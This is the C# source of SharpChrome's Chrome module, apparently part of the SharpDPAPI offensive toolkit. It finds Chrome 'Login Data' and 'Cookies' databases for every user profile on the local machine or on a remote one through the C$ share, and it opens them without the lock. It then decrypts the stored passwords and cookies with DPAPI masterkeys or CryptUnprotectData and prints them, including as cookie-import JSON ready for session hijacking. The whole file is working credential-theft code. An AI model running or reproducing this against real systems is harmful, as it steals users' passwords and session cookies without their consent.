using System;
using System.Collections.Generic;
using System.Text;
using System.Text.RegularExpressions;

using SQLite;
using System.Data;
using System.Security.Cryptography;
using System.IO;

namespace SharpChrome
{
    class Chrome
    {
        // approach adapted from @djhohnstein's https://github.com/djhohnstein/SharpChrome/ project
        //  but using this CSHARP-SQLITE version https://github.com/akveo/digitsquare/tree/a251a1220ef6212d1bed8c720368435ee1bfdfc2/plugins/com.brodysoft.sqlitePlugin/src/wp
        public static void TriageChromeLogins(Dictionary<string, string> MasterKeys, string computerName = "", string displayFormat = "table", bool showAll = false, bool unprotect = false)
        {
            // triage all Chrome 'Login Data' files we can reach

            if (!String.IsNullOrEmpty(computerName))
            {
                // if we're triaging a remote computer, check connectivity first
                bool canAccess = SharpDPAPI.Helpers.TestRemote(computerName);
                if (!canAccess)
                {
                    return;
                }
            }

            if (SharpDPAPI.Helpers.IsHighIntegrity() || (!String.IsNullOrEmpty(computerName) && SharpDPAPI.Helpers.TestRemote(computerName)))
            {
                Console.WriteLine("[*] Triaging Chrome Logins for ALL users\r\n");

                string userFolder = "";
                if (!String.IsNullOrEmpty(computerName))
                {
                    userFolder = String.Format("\\\\{0}\\C$\\Users\\", computerName);
                }
                else
                {
                    userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
                }

                string[] dirs = Directory.GetDirectories(userFolder);

                foreach (string dir in dirs)
                {
                    if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
                    {
                        string loginDataPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", dir);

                        ParseChromeLogins(MasterKeys, loginDataPath, displayFormat, showAll, unprotect);
                    }
                }
            }
            else
            {
                // otherwise just triage the current user's credential folder
                Console.WriteLine("[*] Triaging Chrome Logins for current user\r\n");
                string loginDataPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", System.Environment.GetEnvironmentVariable("USERPROFILE"));

                ParseChromeLogins(MasterKeys, loginDataPath, displayFormat, showAll, true);
            }
        }

        public static void TriageChromeCookies(Dictionary<string, string> MasterKeys, string computerName = "", string displayFormat = "csv", bool showAll = false, bool unprotect = false, string cookieRegex = "", string urlRegex = "")
        {
            // triage all Chrome Cookies we can reach

            if (!String.IsNullOrEmpty(computerName))
            {
                // if we're triaging a remote computer, check connectivity first
                bool canAccess = SharpDPAPI.Helpers.TestRemote(computerName);
                if (!canAccess)
                {
                    return;
                }
            }

            if (SharpDPAPI.Helpers.IsHighIntegrity() || (!String.IsNullOrEmpty(computerName) && SharpDPAPI.Helpers.TestRemote(computerName)))
            {
                Console.WriteLine("[*] Triaging Chrome Cookies for ALL users\r\n");

                string userFolder = "";
                if (!String.IsNullOrEmpty(computerName))
                {
                    userFolder = String.Format("\\\\{0}\\C$\\Users\\", computerName);
                }
                else
                {
                    userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
                }

                string[] dirs = Directory.GetDirectories(userFolder);

                foreach (string dir in dirs)
                {
                    if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
                    {
                        string cookiePath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies", dir);

                        ParseChromeCookies(MasterKeys, cookiePath, displayFormat, showAll, unprotect, cookieRegex, urlRegex);
                    }
                }
            }
            else
            {
                // otherwise just triage the current user's credential folder, so use CryptUnprotectData() by default
                Console.WriteLine("[*] Triaging Chrome Cookies for current user\r\n");
                string cookiePath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies", System.Environment.GetEnvironmentVariable("USERPROFILE"));
                ParseChromeCookies(MasterKeys, cookiePath, displayFormat, showAll, true, cookieRegex, urlRegex);
            }
        }

        public static void ParseChromeLogins(Dictionary<string, string> MasterKeys, string loginDataFilePath, string displayFormat = "table", bool showAll = false, bool unprotect = false)
        {
            // takes an individual 'Login Data' file path and performs decryption/triage on it
            if (!File.Exists(loginDataFilePath))
            {
                return;
            }

            // convert to a file:/// uri path type so we can do lockless opening
            //  ref - https://github.com/gentilkiwi/mimikatz/pull/199
            var uri = new System.Uri(loginDataFilePath);
            string loginDataFilePathUri = String.Format("{0}?nolock=1", uri.AbsoluteUri);

            bool someResults = false;
            SQLiteConnection database = null;

            try
            {
                database = new SQLiteConnection(loginDataFilePathUri, SQLiteOpenFlags.ReadOnly | SQLiteOpenFlags.OpenUri, false);
            }
            catch (Exception e)
            {
                Console.WriteLine("[X] {0}", e.InnerException.Message);
                return;
            }

            if (!displayFormat.Equals("table") && !displayFormat.Equals("csv"))
            {
                Console.WriteLine("\r\n[X] Invalid format: {0}", displayFormat);
                return;
            }
            
            string query = "SELECT signon_realm, origin_url, username_value, password_value, times_used, cast(date_created as text) as date_created FROM logins";
            List<SQLiteQueryRow> results = database.Query2(query, false);

            foreach (SQLiteQueryRow row in results)
            {
                byte[] passwordBytes = (byte[])row.column[3].Value;
                // decrypt the password bytes using masterkeys or CryptUnprotectData()
                byte[] decBytes = SharpDPAPI.Dpapi.DescribeDPAPIBlob(passwordBytes, MasterKeys, "chrome", unprotect);

                string password = Encoding.ASCII.GetString(decBytes);

                DateTime dateCreated = SharpDPAPI.Helpers.ConvertToDateTime(row.column[5].Value.ToString());

                if ((password != String.Empty) || showAll)
                {
                    if (displayFormat.Equals("table"))
                    {
                        if (!someResults)
                        {
                            Console.WriteLine("--- Chrome Credential (Path: {0}) ---\r\n", loginDataFilePath);
                        }
                        someResults = true;
                        Console.WriteLine("URL       : {0} ({1})", row.column[0].Value, row.column[1].Value);
                        Console.WriteLine("Created   : {0}", dateCreated);
                        Console.WriteLine("TimesUsed : {0}", row.column[4].Value);
                        Console.WriteLine("Username  : {0}", row.column[2].Value);
                        Console.WriteLine("Password  : {0}", password);
                        Console.WriteLine();
                    }
                    else
                    {
                        if (!someResults)
                        {
                            Console.WriteLine("file_path,signon_realm,origin_url,date_created,times_used,username,password");
                        }
                        someResults = true;
                        
                        Console.WriteLine("{0},{1},{2},{3},{4},{5},{6}",
                            SharpDPAPI.Helpers.StringToCSVCell(loginDataFilePath),
                            SharpDPAPI.Helpers.StringToCSVCell(String.Format("{0}", row.column[0].Value)),
                            SharpDPAPI.Helpers.StringToCSVCell(String.Format("{0}", row.column[1].Value)),
                            SharpDPAPI.Helpers.StringToCSVCell(dateCreated.ToString()),
                            SharpDPAPI.Helpers.StringToCSVCell(String.Format("{0}", row.column[5].Value)),
                            SharpDPAPI.Helpers.StringToCSVCell(String.Format("{0}", row.column[2].Value)),
                            SharpDPAPI.Helpers.StringToCSVCell(password));
                    }
                }
            }
            database.Close();
        }

        public static void ParseChromeCookies(Dictionary<string, string> MasterKeys, string cookieFilePath, string displayFormat = "table", bool showAll = false, bool unprotect = false, string cookieRegex = "", string urlRegex = "")
        {
            // takes an individual Cookies file path and performs decryption/triage on it

            if (!File.Exists(cookieFilePath))
            {
                return;
            }

            // convert to a file:/// uri path type so we can do lockless opening
            //  ref - https://github.com/gentilkiwi/mimikatz/pull/199
            var uri = new System.Uri(cookieFilePath);
            string cookieFilePathUri = String.Format("{0}?nolock=1", uri.AbsoluteUri);

            bool someResults = false;
            SQLiteConnection database = null;

            if (!displayFormat.Equals("table") && !displayFormat.Equals("csv") && !displayFormat.Equals("json"))
            {
                Console.WriteLine("\r\n[X] Invalid format: {0}", displayFormat);
                return;
            }

            try
            {
                database = new SQLiteConnection(cookieFilePathUri, SQLiteOpenFlags.ReadOnly | SQLiteOpenFlags.OpenUri, false);
            }
            catch (Exception e)
            {
                Console.WriteLine("[X] {0}", e.InnerException.Message);
                return;
            }

            // old - fails in some cases due to partial indexing :(
            //string query = "SELECT cast(creation_utc as text) as creation_utc, host_key, name, path, cast(expires_utc as text) as expires_utc, is_secure, is_httponly, cast(last_access_utc as text) as last_access_utc, encrypted_value FROM cookies";
            
            // new, seems to work with partial indexing??
            string query = "SELECT cast(creation_utc as text) as creation_utc, host_key, name, path, cast(expires_utc as text) as expires_utc, cast(last_access_utc as text) as last_access_utc, encrypted_value FROM cookies";
            List<SQLiteQueryRow> results = database.Query2(query, false);
            int id = 1;

            foreach (SQLiteQueryRow row in results)
            {
                byte[] valueBytes = (byte[])row.column[6].Value;
                byte[] decBytes = SharpDPAPI.Dpapi.DescribeDPAPIBlob(valueBytes, MasterKeys, "chrome", unprotect);
                string value = Encoding.ASCII.GetString(decBytes);

                DateTime dateCreated = SharpDPAPI.Helpers.ConvertToDateTime(row.column[0].Value.ToString());
                DateTime expires = SharpDPAPI.Helpers.ConvertToDateTime(row.column[4].Value.ToString());
                DateTime lastAccess = SharpDPAPI.Helpers.ConvertToDateTime(row.column[5].Value.ToString());

                // check conditions that will determine whether we're displaying this cookie entry
                bool displayValue = false;
                if (showAll)
                {
                    displayValue = true;
                }
                else if (!String.IsNullOrEmpty(cookieRegex))
                {
                    Match match = Regex.Match(row.column[2].Value.ToString(), cookieRegex, RegexOptions.IgnoreCase);
                    if (match.Success)
                    {
                        displayValue = true;
                    }
                }
                else if (!String.IsNullOrEmpty(urlRegex))
                {
                    Match match = Regex.Match(row.column[1].Value.ToString(), urlRegex, RegexOptions.IgnoreCase);
                    if (match.Success)
                    {
                        displayValue = true;
                    }
                }
                else if (expires > DateTime.UtcNow)
                {
                    displayValue = true;
                }

                if (displayValue)
                {
                    if (displayFormat.Equals("table"))
                    {
                        if (!someResults)
                        {
                            Console.WriteLine("--- Chrome Cookies (Path: {0}) ---\r\n", cookieFilePath);
                        }
                        someResults = true;

                        Console.WriteLine("Host (path)                : {0} ({1})", row.column[1].Value, row.column[3].Value);
                        Console.WriteLine("Cookie Name                : {0}", row.column[2].Value);
                        Console.WriteLine("Cookie Value               : {0}", value);
                        Console.WriteLine("Created/Expires/LastAccess : {0} / {1} / {2}\r\n", dateCreated, expires, lastAccess);
                    }
                    else if (displayFormat.Equals("json"))
                    {
                        if (!someResults)
                        {
                            Console.WriteLine("--- Chrome Cookies (Path: {0}) ---\r\n\r\nEditThisCookie import JSON:\r\n\r\n[\r\n{{\r\n", cookieFilePath);
                        }
                        else
                        {
                            Console.WriteLine("},\r\n{\r\n");
                        }
                        someResults = true;

                        Int32 unixTimestamp = (Int32)(expires.Subtract(new DateTime(1970, 1, 1))).TotalSeconds;

                        Console.WriteLine("    \"domain\": \"{0}\",", SharpDPAPI.Helpers.CleanForJSON(String.Format("{0}", row.column[1].Value)));
                        Console.WriteLine("    \"expirationDate\": {0},", unixTimestamp);
                        Console.WriteLine("    \"hostOnly\": false,");
                        Console.WriteLine("    \"httpOnly\": false,");
                        Console.WriteLine("    \"name\": \"{0}\",", SharpDPAPI.Helpers.CleanForJSON(String.Format("{0}", row.column[2].Value)));
                        Console.WriteLine("    \"path\": \"{0}\",", String.Format("{0}", row.column[3].Value));
                        Console.WriteLine("    \"sameSite\": \"no_restriction\",");
                        Console.WriteLine("    \"secure\": false,");
                        Console.WriteLine("    \"session\": false,");
                        Console.WriteLine("    \"storeId\": \"0\",");
                        Console.WriteLine("    \"value\": \"{0}\",", SharpDPAPI.Helpers.CleanForJSON(value));
                        Console.WriteLine("    \"id\": \"{0}\"", id);
                        id++;
                    }
                    else
                    {
                        // csv output
                        if (!someResults)
                        {
                            Console.WriteLine("file_path,host,path,name,value,creation_utc,expires_utc,last_access_utc");
                        }
                        someResults = true;

                        Console.WriteLine("{0},{1},{2},{3},{4},{5},{6},{7}",
                                SharpDPAPI.Helpers.StringToCSVCell(cookieFilePath),
                                SharpDPAPI.Helpers.StringToCSVCell(String.Format("{0}", row.column[1].Value)),
                                SharpDPAPI.Helpers.StringToCSVCell(String.Format("{0}", row.column[3].Value)),
                                SharpDPAPI.Helpers.StringToCSVCell(String.Format("{0}", row.column[2].Value)),
                                SharpDPAPI.Helpers.StringToCSVCell(value),
                                SharpDPAPI.Helpers.StringToCSVCell(dateCreated.ToString()),
                                SharpDPAPI.Helpers.StringToCSVCell(expires.ToString()),
                                SharpDPAPI.Helpers.StringToCSVCell(lastAccess.ToString()));
                    }
                }
            }

            if (displayFormat.Equals("json") && someResults)
            {
                Console.WriteLine("}\r\n]\r\n");
            }

            database.Close();
        }
    }
}
